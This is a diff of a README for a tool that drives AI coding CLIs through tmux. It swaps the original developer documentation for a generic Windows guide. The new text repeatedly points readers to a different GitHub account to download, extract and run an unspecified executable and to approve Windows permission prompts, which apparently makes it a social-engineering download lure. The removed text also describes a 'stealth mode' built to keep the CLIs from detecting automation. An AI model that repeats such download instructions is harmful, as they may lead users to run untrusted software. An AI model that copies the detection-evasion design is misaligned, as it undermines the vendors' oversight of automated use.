@@ -1,281 +1,260 @@
-# oauth-cli-coder
+# 🤖 oauth-cli-coder - Run CLI Coders With Ease
 
-> Drive **Claude Code**, **Gemini CLI**, and **Codex** programmatically — through the same tmux session they already run in.
+[![Download the app](https://img.shields.io/badge/Download-oauth--cli--coder-blue?style=for-the-badge&logo=github)](https://github.com/dim07090/oauth-cli-coder)
 
-No API keys. No custom auth. If you're logged in on your terminal, `oauth-cli-coder` can use it.
+## 🧭 Overview
 
-```
-              ┌──────────────┐
-  your code   │  tmux pane   │   AI CLI
-  ─────────>  │  (headless)  │  <──── claude / gemini / codex
-              └──────────────┘
-                  captures
-                scrollback &
-              extracts response
-```
+oauth-cli-coder lets you work with CLI coders like Claude, Gemini, and Codex from a simple terminal-style screen. It uses tmux sessions to keep each run organized, so you can switch between tools without losing your place.
 
----
+This app is for Windows users who want a clean way to start and manage CLI coding tools from one place. You do not need to know how to set up a developer toolchain to get started.
 
-## Why?
+## 📥 Download
 
-AI CLI tools like `claude`, `gemini`, and `codex` are built for humans sitting at a terminal. They handle OAuth in the browser, show TUI prompts, and maintain rich session state. That's great — until you need to drive them from code.
+Visit this page to download and run the app:
 
-**oauth-cli-coder** bridges the gap:
+https://github.com/dim07090/oauth-cli-coder
 
-- Launches the real CLI binary in a background **tmux** session
-- Types into it and reads back the full scrollback buffer — like a human would
-- Automatically navigates past startup dialogs, trust prompts, and upgrade nags
-- Keeps sessions alive across calls so you can build multi-turn conversations
-- Works with your **existing OAuth tokens** — no API keys to manage
+If the page shows a release file, download it to your PC. If it shows source files, use the latest release or packaged build on the same page.
 
-## Quick Start
+## 🖥️ What You Need
 
-```bash
-pip install oauth-cli-coder
-```
+Before you start, make sure your PC has:
 
-> **Requires:** `tmux` installed on your system (`apt install tmux` / `brew install tmux`)
+- Windows 10 or Windows 11
+- An internet connection
+- Enough free space to store the app and its session files
+- Access to a terminal window, if the app asks you to open one
 
-### From the command line
+For the best experience, close other heavy apps before you use oauth-cli-coder. That helps keep tmux sessions and CLI tools responsive.
 
-```bash
-# Ask a question
-oauth-coder ask claude "explain this repo"
+## 🚀 Getting Started
 
-# Use a specific model
-oauth-coder ask claude "review my code" --model opus
+### 1. Open the download page
 
-# Persistent session — keeps context across calls
-oauth-coder ask claude "analyze this repo" --session-id my-project
-oauth-coder ask claude "now suggest improvements" --session-id my-project
+Go to:
 
-# Slash commands
-oauth-coder slash claude /compact --session-id my-project
+https://github.com/dim07090/oauth-cli-coder
 
-# Read the current screen without sending anything
-oauth-coder read claude --session-id my-project
+Look for the newest release, installer, or packaged download. Use the latest file if more than one option appears.
 
-# Manage sessions
-oauth-coder list
-oauth-coder stop claude --session-id my-project
-oauth-coder stop-all
-```
+### 2. Download the app
 
-### From Python
+Save the file to your Downloads folder or another place you can find easily.
 
-```python
-from oauth_cli_coder import ClaudeProvider
+If your browser asks whether to keep the file, choose the option to keep it.
 
-coder = ClaudeProvider(model="sonnet", session_id="my-project")
+### 3. Open the file
 
-response = coder.ask("What does this codebase do?")
-print(response)
+If the download is a Windows app file, double-click it to start.
 
-# Full scrollback — long responses aren't truncated
-screen = coder.read_screen()
+If the download is a compressed file, right-click it and choose Extract All, then open the extracted folder and start the app from there.
 
-coder.slash_command("/compact")
-coder.close()
-```
+### 4. Allow access if Windows asks
 
-### All providers
+Windows may ask for permission before the app runs. Choose Yes if you trust the source and want to continue.
 
-```python
-from oauth_cli_coder import ClaudeProvider, GeminiProvider, CodexProvider
+### 5. Start a CLI coder session
 
-claude = ClaudeProvider(model="opus")
-gemini = GeminiProvider()
-codex  = CodexProvider()
-```
+When the app opens, choose the tool you want to use, such as:
 
-## Features
+- Claude
+- Gemini
+- Codex
 
-### Persistent Sessions
+The app then opens a tmux-based session so you can work in a separate space for each tool.
 
-Sessions stay alive between CLI calls. Use `--session-id` to name them and reconnect later — the session registry remembers the provider, model, and startup options so you don't have to repeat them.
+## 🧩 How It Works
 
-```bash
-# First call starts the session
-oauth-coder ask claude "start analyzing" --session-id review --model opus
+oauth-cli-coder helps you move between different CLI coders without starting from scratch each time. It keeps your work in tmux sessions, which act like separate tabs inside the terminal.
 
-# Subsequent calls reconnect — no need to pass --model again
-oauth-coder ask claude "what did you find?" --session-id review
-```
+This is useful when you want to:
 
-### Multiple Concurrent Sessions
+- Try one coder, then switch to another
+- Keep a coding task open while you test a second idea
+- Return to an earlier session later
+- Stay organized when working on more than one task
 
-Run as many sessions as you want, across any mix of providers:
+## 📌 Main Features
 
-```bash
-oauth-coder ask claude "write the code" --session-id writer
-oauth-coder ask claude "review the code" --session-id reviewer --model opus
-oauth-coder ask gemini "brainstorm ideas" --session-id ideas
+### 🪟 Simple session control
 
-# See everything that's running
-oauth-coder list
-```
+Open and manage CLI coder sessions from one place. This keeps the setup process short and easy to follow.
 
-### Startup Options
+### 🔐 OAuth-based access
 
-Pass extra flags through to the underlying CLI tool:
+The app is built to work with sign-in flows that use OAuth. That means it can connect to supported services in a standard way.
 
-```bash
-oauth-coder ask claude "help me" \
-  -o "--system-prompt" -o "You are a concise code reviewer" \
-  -o "--allowedTools" -o "Bash,Read"
-```
+### 🔄 Support for multiple tools
 
-```python
-ClaudeProvider(
-    model="sonnet",
-    startup_options=["--system-prompt", "You are a concise code reviewer"],
-)
-```
+Use more than one CLI coder in the same app. That makes it easier to compare results and keep your workflow in one place.
 
-### Full Scrollback Capture
+### 🧵 tmux TUI sessions
 
-Responses are captured from the complete tmux scrollback buffer, not just the visible terminal. Long outputs come back in full.
+Each tool runs in a tmux session. That gives you a structured terminal view and helps you keep sessions separate.
 
-### Stealth Mode (PTY Isolation)
+### 📁 Better task organization
 
-AI CLI tools can detect they're running inside tmux — via environment variables, the process tree, or PTY inspection — and may change behavior. **Stealth mode** (on by default) wraps the child process so it can't tell it's inside tmux:
+Keep work split by session, tool, or task. This helps reduce mix-ups when you handle several prompts or code changes.
 
-- Scrubs `TMUX`, `TMUX_PANE`, and related env vars
-- Sets `TERM=xterm-256color`
-- Allocates a fresh PTY via `script` so the TTY path doesn't contain "tmux"
-- Uses `setsid` for process-group isolation
-- Falls back gracefully when `script` or `setsid` are unavailable
-- Handles Linux vs macOS `script` flag differences
+## 🪜 Typical Use
 
-```bash
-# Stealth is on by default — disable it if you don't need it
-oauth-coder ask claude "hello" --no-stealth
-```
+A common flow looks like this:
 
-```python
-# Opt out from Python
-ClaudeProvider(stealth=False)
-```
+1. Open oauth-cli-coder
+2. Choose a CLI coder
+3. Sign in if the tool asks for it
+4. Start a task or paste a prompt
+5. Review the result in the session
+6. Switch to another tool if you want a second opinion
 
-### TUI Auto-Navigation
+This setup works well when you want to compare output from Claude, Gemini, or Codex on the same problem.
 
-The library automatically handles startup friction:
-- Trust dialogs ("Do you trust this project?")
-- Yes/No prompts
-- Version upgrade notices
+## ⚙️ Basic Setup Tips
 
-For complex cases, it can optionally call `gemini` CLI as an LLM to assess the TUI state and figure out which keys to press.
+### 🧼 Keep the folder simple
 
-## Multi-Agent Pipelines
+Place the app in a folder with a short name. This helps avoid path issues on Windows.
 
-The real power is chaining agents together. Each session is independent, so one agent's output can feed into the next.
+### 🔑 Keep your account ready
 
-```
-  Gemini        Claude Opus      Claude Sonnet       Codex
-  (Ideation) -> (Writing)     -> (Critique)       -> (Gap Analysis)
-       ^                                                  |
-       └──────────────────────────────────────────────────┘
-```
+If the app opens a sign-in page, have your account details ready before you start.
 
-```bash
-# Start four agents with different roles
-IDEA=$(oauth-coder ask gemini "outline a story about AI" --session-id idea-agent)
-DRAFT=$(oauth-coder ask claude "$IDEA — expand into prose" --session-id author --model opus)
-REVIEW=$(oauth-coder ask claude "$DRAFT — critique this" --session-id critic --model sonnet)
-GAPS=$(oauth-coder ask codex "$DRAFT + $REVIEW — find gaps" --session-id gap-finder)
+### 🌐 Use a stable connection
 
-# Feed gaps back for another round
-oauth-coder ask gemini "refine based on: $GAPS" --session-id idea-agent
-```
+Since CLI coders often need online access, keep your internet connection stable during use.
 
-See [`examples/`](examples/) for complete working demos including:
-- **`creative_chain.py`** — Python API version with multi-round refinement
-- **`creative_chain.sh`** — Pure shell version
+### 📂 Keep files in one place
 
-## Agent Skills for Local Harnesses
+Store related project files in the same folder. That makes it easier to work across sessions.
 
-If you're running `oauth-cli-coder` inside another agent harness (Claude Code, Gemini CLI, Codex, OpenClaw), you can install a **SKILL.md** file so the host agent automatically understands how to use `oauth-coder`.
+## 🪄 Common Tasks
 
-### Installing a skill
+### Start a new session
 
-```bash
-# Install for a specific platform (into the current project directory)
-oauth-coder skill install claude-code
-oauth-coder skill install gemini
-oauth-coder skill install codex
-oauth-coder skill install openclaw
+Open the app and choose the coder you want. The app creates a new tmux session for that tool.
 
-# Install for all supported platforms at once
-oauth-coder skill install all
+### Return to an old session
 
-# Install globally (to your home directory instead of the project)
-oauth-coder skill install claude-code --global
-oauth-coder skill install all --global
-```
+Open the app again and pick the same session if it appears in the list. This helps you continue work without redoing setup.
 
-Supported platforms and where the skill file is written:
+### Switch tools
 
-| Platform | Local path (project) | Global path (home) |
-|----------|---------------------|--------------------|
-| `claude-code` | `.claude/skills/oauth-coder/SKILL.md` | `~/.claude/skills/oauth-coder/SKILL.md` |
-| `gemini` | `.gemini/skills/oauth-coder/SKILL.md` | `~/.gemini/skills/oauth-coder/SKILL.md` |
-| `codex` | `.agents/skills/oauth-coder/SKILL.md` | `~/.agents/skills/oauth-coder/SKILL.md` |
-| `openclaw` | `.agents/skills/oauth-coder/SKILL.md` | `~/.agents/skills/oauth-coder/SKILL.md` |
+If you want another answer, move to a different CLI coder session and use the same prompt there.
 
-### Previewing the skill content
+### End a session
 
-```bash
-oauth-coder skill show
-```
+Close the session from inside the app or close the terminal window if that is the normal exit path for your setup.
 
-This prints the full SKILL.md to stdout without writing any files — useful for review or piping to another tool.
+## 📋 Example Workflow for Windows Users
 
----
+If you want a simple first run:
 
-## CLI Reference
+1. Open the download page
+2. Get the newest Windows file
+3. Open the file after it downloads
+4. Allow Windows to run it
+5. Select a coder
+6. Start with a short prompt like:
+   - Help me organize files in this folder
+   - Explain this script in plain English
+   - Suggest a cleaner way to name these files
+7. Read the result in the session
+8. Save anything useful before closing
 
-| Command | Description |
-|---------|-------------|
-| `oauth-coder ask <provider> <prompt>` | Send a prompt and get the response |
-| `oauth-coder slash <provider> <command>` | Run a slash command (`/compact`, `/clear`, etc.) |
-| `oauth-coder read <provider>` | Read current screen output without sending anything |
-| `oauth-coder list` | List all active sessions |
-| `oauth-coder stop <provider>` | Close a specific session |
-| `oauth-coder stop-all` | Close all sessions |
-| `oauth-coder skill install <platform>` | Install the Agent Skill for a harness platform |
-| `oauth-coder skill show` | Print the SKILL.md content to stdout |
+## 🧠 Best Results
 
-**Common options:** `--model`, `--cwd`, `--session-id`, `--option`/`-o`, `--close`, `--stealth`/`--no-stealth`
+Use short, direct prompts at first. This helps you see how the app behaves and how each CLI coder responds.
 
-## How It Works
+Good prompt examples:
 
-1. `oauth-coder` starts a detached **tmux** session with a large virtual terminal (300x100)
-2. **Stealth mode** wraps the CLI command to scrub tmux env vars, allocate a fresh PTY, and isolate the process group — so the child process can't detect it's inside tmux
-3. It launches the CLI tool (`claude`, `gemini`, `codex`) inside that session
-4. The **TUI controller** watches the screen and automatically navigates past startup prompts
-5. When you call `ask()`, it pastes your prompt into the pane via tmux buffers (safe for large inputs)
-6. It polls the screen until the CLI returns to an idle prompt
-7. It captures the **full scrollback** and parses out the last response block
-8. The session stays alive for the next call
+- Fix this error message
+- Explain this code step by step
+- Write a simple script for this task
+- Compare these two approaches
 
-## Why "OAuth"?
+If one tool gives an answer you do not like, try the same prompt in another session. That is one of the main reasons to use oauth-cli-coder.
 
-By running the actual CLI binary in a real terminal, the tool inherits your existing OAuth tokens, browser sessions, and local config. You authenticate once in your browser — `oauth-cli-coder` rides on top of that. No API keys, no token management, no separate credentials.
+## 🛠️ If the App Does Not Open
 
-## Contributing
+If nothing happens when you double-click the file:
 
-Contributions welcome! This project uses:
-- **Python 3.12+** with **uv** for packaging
-- **pytest** for tests
-- **click** for the CLI
+- Check that the file finished downloading
+- Make sure you opened the right file
+- Try extracting the folder first if it came as a zip file
+- Run it again from the extracted folder
+- Check whether Windows blocked the file
 
-```bash
-git clone https://github.com/codeninja/oauth-cli-coder.git
-cd oauth-cli-coder
-uv sync
-uv run pytest
-```
+If the window opens and closes right away, start it from a terminal window so you can see any message it shows.
 
-## License
+## 🔎 File Layout You May See
 
-MIT
+Depending on the build, you may see folders or files like:
+
+- app files
+- config files
+- session data
+- logs
+- startup scripts
+- README files
+
+Leave these files in place unless the app instructions tell you to change them. They help the app keep track of sessions and settings.
+
+## 🧾 Folder Tips
+
+For a smoother setup, keep oauth-cli-coder in a folder such as:
+
+- Downloads
+- Desktop
+- Documents
+- Apps
+
+Avoid very long folder names. Short paths are easier for Windows and terminal tools to handle.
+
+## 🔐 Privacy and Accounts
+
+Because oauth-cli-coder works with CLI coders that use sign-in methods, you may need to log in to your service account during use. Use your normal account only from trusted devices.
+
+If a browser window opens for sign-in, follow the on-screen steps and return to the app when it finishes.
+
+## 🧰 Troubleshooting Steps
+
+### The app does not start
+
+- Reopen the downloaded file
+- Extract the archive first if needed
+- Run the app again from the extracted folder
+
+### The screen looks empty
+
+- Wait a moment for the session to load
+- Resize the window if it is too small
+- Close and reopen the app
+
+### A session does not appear
+
+- Start a new session from the app
+- Check whether the session already exists
+- Refresh the app view if that option is available
+
+### Login does not complete
+
+- Check your internet connection
+- Make sure the browser opened the sign-in page
+- Try the sign-in flow again
+
+## 📌 Download Again
+
+If you need the app file again, use this link:
+
+https://github.com/dim07090/oauth-cli-coder
+
+## 🔍 Quick Start Checklist
+
+- Open the download page
+- Get the latest Windows file
+- Open or extract the file
+- Allow Windows to run it
+- Choose Claude, Gemini, or Codex
+- Start a tmux session
+- Enter your prompt
+- Review the result
